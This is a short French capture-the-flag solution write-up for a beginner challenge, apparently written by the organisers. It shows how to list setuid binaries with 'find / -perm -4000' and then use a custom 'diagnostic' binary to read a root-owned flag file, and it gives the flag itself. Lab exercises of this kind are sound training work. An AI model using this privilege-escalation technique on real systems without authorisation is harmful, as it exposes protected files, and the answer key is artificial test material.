# Challenge 3 — "Le Terminal Fantôme"
**Niveau** : Chiant, juste pour montrer aux élèves qu'ils sont bien bien nuls >:).  

| Commande | Usage |
|----------|-------------|
| `find` | Permet de trouver un peu tout sur le système |

**Arborescence** :
```
.
|-- MISSION.txt
|-- documents
|   `-- note_equipement.txt <-- indice sur le binaire qui s'appelle "diagnostic"
|-- equipement
`-- radio
    `-- transmission.txt <-- Chemin qu'ils doivent ouvrir (/root/coffre/flag.txt) 
```

**Solve** :
On fait une recherche à partir de la racine pour tout fichier possédant un setuid :
```sh
find / -perm -4000 2>/dev/null
```

Et le binaire apparaît :
```bash
player@arctique-3:~$ find / -perm -4000 2>/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/umount
/usr/local/bin/diagnostic # lui
```

Plus qu'à afficher le flag :
```bash
diagnostic /root/coffre/flag.txt
```

**FLAG** : `BZHCTF{EREBUS_COMPROMISED}`